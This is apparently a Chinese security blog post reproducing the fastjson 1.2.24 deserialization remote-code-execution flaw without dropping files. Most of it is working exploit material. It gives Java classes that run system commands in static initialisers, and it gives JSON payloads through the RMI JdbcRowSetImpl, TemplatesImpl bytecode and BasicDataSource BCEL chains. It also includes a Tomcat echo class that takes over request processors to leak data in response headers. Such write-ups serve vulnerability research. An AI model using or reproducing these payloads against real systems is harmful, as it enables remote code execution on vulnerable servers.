
### fastjson<=1.2.4无落地利用复现与分析



fastjson版本 <= 1.2.24，通过触发点`JSON.parseObject()`这个函数，将`json`中的类设置成`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`达到构造恶意命令执行。

TemplatesImpl类，存在一个字段_bytecodes，通过这个字段传入一个恶意Class，生成时执行我们的构造函数。

那么就可以准备一个poc，生成一个evil.class,装载入_bytecodes，达到执行恶意代码。

poc

```java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile2 {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/success1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            
        }
    }
}
```

rmi利用

```
{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://10.24.178.103:9988/TouchFile",
        "autoCommit":true
    }
}
```



![image-20210505201358650](https://i.loli.net/2021/05/05/u3zgJmTLfnKlNhq.png)

![image-20210505201455973](https://i.loli.net/2021/05/05/iMWRcSVDAxpmTqj.png)

发送payload

![image-20210505201605206](https://i.loli.net/2021/05/05/mptQZM7TfXhs2xB.png)

生成success1

![image-20210505201654299](https://i.loli.net/2021/05/05/deQGrSh1nfP8cMg.png)

**com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl** _bytecode链

![image-20210505201747204](https://i.loli.net/2021/05/05/v67IJ9gPNlpTrhC.png)

![image-20210505201853268](https://i.loli.net/2021/05/05/F9zH1eQbLErTvC5.png)

```json
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQAKAoACgAUCgAVABYHABcIABgIABkKABUAGgoAGwAcBwAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAHQEAClNvdXJjZUZpbGUBAA9Ub3VjaEZpbGUyLmphdmEMAAsADAcAIAwAIQAiAQAQamF2YS9sYW5nL1N0cmluZwEABXRvdWNoAQANL3RtcC9zdWNjZXNzMgwAIwAkBwAlDAAmACcBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAKVG91Y2hGaWxlMgEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAHd2FpdEZvcgEAAygpSQAhAAkACgAAAAAAAgABAAsADAABAA0AAAAdAAEAAQAAAAUqtwABsQAAAAEADgAAAAYAAQAAAAQACAAPAAwAAQANAAAAaAAEAAMAAAAjuAACSwW9AANZAxIEU1kEEgVTTCortgAGTSy2AAdXpwAES7EAAQAAAB4AIQAIAAIADgAAAB4ABwAAAAcABAAIABMACQAZAAoAHgANACEACwAiAA4AEAAAAAcAAmEHABEAAAEAEgAAAAIAEw=="],"_name":"a.b","_tfactory":{ },"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}
```

![image-20210505202403085](/Users/qcloverzeng/Library/Application Support/typora-user-images/image-20210505202403085.png)

![image-20210505202425955](/Users/qcloverzeng/Library/Application Support/typora-user-images/image-20210505202425955.png)

参考文章https://developer.aliyun.com/article/676234

在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化。_tfactory这个字段在TemplatesImpl既没有get方法也没有set方法，这没关系，我们设置_tfactory为`{ }`,fastjson会调用其无参构造函数得_tfactory对象。解决了某些版本中在defineTransletClasses()用到会引用_tfactory属性导致异常退出。

将TomcatEcho编译成class编码到bytecode，进行本地加载.

受九指师傅启发可构造tomca本地加载+回显进行利用

POC:TomcatEchoByte.java

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;

import org.apache.coyote.Request;
import org.apache.tomcat.util.net.AbstractEndpoint;

import java.lang.reflect.Field;
import java.util.ArrayList;

public class TomcatEchoByte extends AbstractTranslet {

    public Object getO(Object o, String s) throws Exception {
        Field f = o.getClass().getDeclaredField(s);
        f.setAccessible(true);
        return f.get(o);
    }

    public TomcatEchoByte() throws Exception {
        System.out.println("Fastjson Echo test!!!");
        Object o;
        String s;
        for (Thread t : (Thread[]) getO(Thread.currentThread().getThreadGroup(), "threads")) {
            s = t.getName();
            System.out.println("循环打印threadName");
            System.out.println(s);
            System.out.println("----------------");
            if (!s.contains("exec") && s.contains("http") && !s.contains("BlockPoller")) {
                try {
                    o = getO(getO(getO(t, "target"), "this$0"), "handler");
                } catch (Exception e) {
                    //tomcat 8.5.* ~
                    o = getO(getO(t, "target"), "this$0");
                    Field f = AbstractEndpoint.class.getDeclaredField("handler");
                    f.setAccessible(true);
                    o = f.get(o);
                }
                try {
                    //tomcat 6.*
                    o = getO(o, "global");
                } catch (Exception e) {
                    //tomcat7.*-8.0.*
                    o = o.getClass().getSuperclass().getDeclaredMethod("getGlobal").invoke(o);
                }
                System.out.println("开始循环processors !!!");
                for (Object p : (ArrayList<?>) getO(o, "processors")) {
                    Request r = (Request)getO(p, "req");
                    String path = Thread.currentThread().getContextClassLoader().getResource("/").getPath();
                    r.getResponse().addHeader("Server-ok", path);
                    System.out.println("测试打印网站路径 !!!" + path);
                }
                break;
            }
        }
    }



    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException {
    }
    public static void main(String[] args) throws Exception {
        TomcatEchoByte t = new TomcatEchoByte();
    }
}
```

![image-20210505203032510](/Users/qcloverzeng/Library/Application Support/typora-user-images/image-20210505203032510.png)

该链利用条件：

- 反序列化的格式是JSON.parseObject(jsonStr)即可。
- fastjson <= 1.2.24
- 服务端开启了Feature.SupportNonPublicField（>1.2.24不再支持）

**Fastjson BasicDataSource**攻击链

该攻击链主要用到条攻击链用到”org.apache.tomcat.dbcp.dbcp.BasicDataSource”、”org.apache.tomcat.dbcp.dbcp2.BasicDataSource”。

攻击链：

tomcat-dbcp-7.0.99.jar
dbcp-6.0.53.jar
tomcat-dbcp-9.0.20.jar
tomcat-juli-9.0.20.jar

需要注意的是TIPS:

1.BasicDataSource类在旧版本的 tomcat-dbcp 包中，对应的路径是 org.apache.tomcat.dbcp.dbcp.BasicDataSource。比如：6.0.53、7.0.81等版本。

2.在Tomcat 8.0之后包路径有所变化，更改为了 org.apache.tomcat.dbcp.dbcp2.BasicDataSource

@VulVersion({"1.2.2.1-1.2.2.4"})

@Dependencies({"tomcat-dbcp:tomcat-dbcp:7.x","tomcat-dbcp:tomcat-dbcp:9.x","commons-dbcp:commons-dbcp:1.4"})

环境搭建：https://blog.csdn.net/qq_40989258/article/details/103049474

tomcat有一个tomcat-dbcp.jar组件是tomcat用来连接数据库的驱动程序存在一个org.apache.tomcat.dbcp.dbcp.**BasicDataSource**类，类中Class.forName可将driverClassLoader和driverClassName设置为json指定的内容，并通过传参数执行代码。通过Class.forName传入BCEL编码的evil.class文件，com.sun.org.apache.bcel.internal.util.ClassLoader的classloader会先把它解码成一个byte[]，然后调用defineClass还原出恶意Class，执行任意代码。于是根据fastjson漏洞逻辑，控制Class.forName加载的类和ClassLoader，加载还原出的恶意Class执行人员代码。

BCEL编码

```
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;


public class BCELEncode
{
    public static void main(String []args) throws Exception{
        //There also should be compiled class file,not java file
        Path path = Paths.get( "../poc/TouchFile2.class");
        byte[] data = Files.readAllBytes( path);
        String s =  Utility.encode( data, true);
        System.out.println(s);
        testBCELEncode("$$BCEL$$"+ s );
    }


    static void testBCELEncode(String s ){
        String classname = "org.apache.log4j.spi"+s;
        ClassLoader cls = new com.sun.org.apache.bcel.internal.util.ClassLoader();
        try
        {
            Class.forName(classname, true, cls);
        }
        catch ( ClassNotFoundException e )
        {
            e.printStackTrace();
        }
    }
}
```

![image-20210511222040231](/Users/qcloverzeng/Library/Application Support/typora-user-images/image-20210511222040231.png)

![image-20210511222104081](/Users/qcloverzeng/Library/Application Support/typora-user-images/image-20210511222104081.png)

最终Payload

```
{
    {
        "@type":"com.alibaba.fastjson.JSONObject",
        "name":
        {
            "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
            "driverClassLoader":
            {
                "@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"
            },
            "driverClassName":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQMO$db$40$Q$7d$9b8Yc$ccW$C$a5$b4$r$U$C$ad$81$K_z$L$aa$84P$91$w$CT$Y$b5B$3dm$96UXpl$cbY$D$fdE$3ds$BT$89$fe$80$fe$u$c4$d8B$a1$94$3d$cc$c7$db73og$ff$de$fd$fe$D$e0$p$3c$H$O$s$jL$e1$F$c7$b4$8d$976f$f2$ec$95$83$d7x$c31$cb$d1$e0$98c$a8$ae$ebH$9bO$Meo$f9$h$83$b5$Z$l$v$86$b1$b6$8e$d4n$d6$eb$a8$f4$40tBB$ecu$Z$3e0G$C$p$e4$e9$8eH$8a$x$ea$c5$e0$Eq$96J$b5$a5s$ea$e8A$9c$c9$e3$3c$5e$3b$Rg$c2$c50$5c$8e$b7$$$e6$b1$c00$9ec$7e$u$a2$ae$l$98TG$5d$g$g$t$wbh$fa$c1$cf$beQ$3d$7f$pIB$z$85$d1q$d4$f77E$u$b3P$988$5d$TI$e2$a2$89E$8e$r$X$ef$f0$9e$a1$fe$d8$ec$f3$85TI$5e$c204$Q$f0d$dc$5e$e7DI$c30$f1$I$edg$91$d1$3d$a29$5de$G$c9$94$b7$dc$7e$c6i$91Nu$a1$q$83$e7$fdh$ff$ff$88$d6$bf$V_$d3X$aa$7e$bf$f5d$d4$D$c8$c0$cf$856$5bqZ$ac$fc$L$ze$88$be$w$3f$r$b0$7cUdG$u$9b$r$cf$c8WV$ae$c1$$$v$a0$c5$92$ad$W$a0$F$hc$D$ea1$e5e$f2$cd$h$94$b6$x$b7$u$l$96kVph$d5$wA$7be$f5$K$d5$9d$PW$e0$df$7f$c1$da$be$y$ca$h4$d5$a6y$a3E$cc$c9$f2$a2e$9d$b4$cc$90$9a$G$b5$9d$t$z$L$c4$Y$_nK$82c$o$d7P$x$84$d6$ef$B$9dl$94$3ai$C$A$A"
        }
    }:"age"
}
```

本地测试

![image-20210511222258873](/Users/qcloverzeng/Library/Application Support/typora-user-images/image-20210511222258873.png)

搭建环境测试

![image-20210511222328957](/Users/qcloverzeng/Library/Application Support/typora-user-images/image-20210511222328957.png)

遗憾的是只能用于Fastjson 1.2.24及更低版本。

参考：

https://www.freebuf.com/articles/others-articles/167932.html

https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html